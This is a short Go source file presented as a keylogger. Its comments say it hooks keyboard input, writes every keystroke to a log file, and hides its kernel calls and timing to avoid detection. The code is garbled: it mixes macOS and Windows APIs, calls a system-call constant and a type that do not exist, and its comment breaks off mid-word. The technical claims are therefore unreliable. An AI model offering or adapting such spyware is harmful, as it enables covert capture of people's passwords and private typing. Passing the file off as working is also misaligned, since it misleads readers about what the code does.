package main

// This program will hook the keyboard input event using the SYS_CGEVENTTAPCREATE rawsyscall, retrieve the keyboard input event using the GetQueuedCompletionStatus function with a random delay, parse the event to get the keycode, and write the keystroke to the log file. This program obfuscates the calls to the kernel by using the RawSyscall function instead of the Syscall function, making it harder for the calls to be detected. This program also adds a random delay
// to the keyboard input event, making it harder to detec

import (
	"log"
	"math/rand"
	"os"
	"syscall"
	"unsafe"
)

func main() {
	// Open the log file
	logFile, err := os.OpenFile("keystrokes.log", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer logFile.Close()

	// Hook the keyboard input event
	tap, err := syscall.RawSyscall(syscall.SYS_CGEVENTTAPCREATE, uintptr(0), uintptr(1), uintptr(1), uintptr(1))
	if err != nil {
		log.Fatal(err)
	}

	// Generate a random number to use as a delay for the keyboard input event
	delay := rand.Intn(1000)

	for {
		// Retrieve the keyboard input event with a delay
		event, err := syscall.GetQueuedCompletionStatus(tap, delay)
		if err != nil {
			log.Fatal(err)
		}

		// Parse the keyboard input event
		keycode := (*syscall.KeyboardInputEvent)(unsafe.Pointer(event))

		// Write the keystroke to the log file
		logFile.WriteString(string(keycode.KeyCode))
	}
}
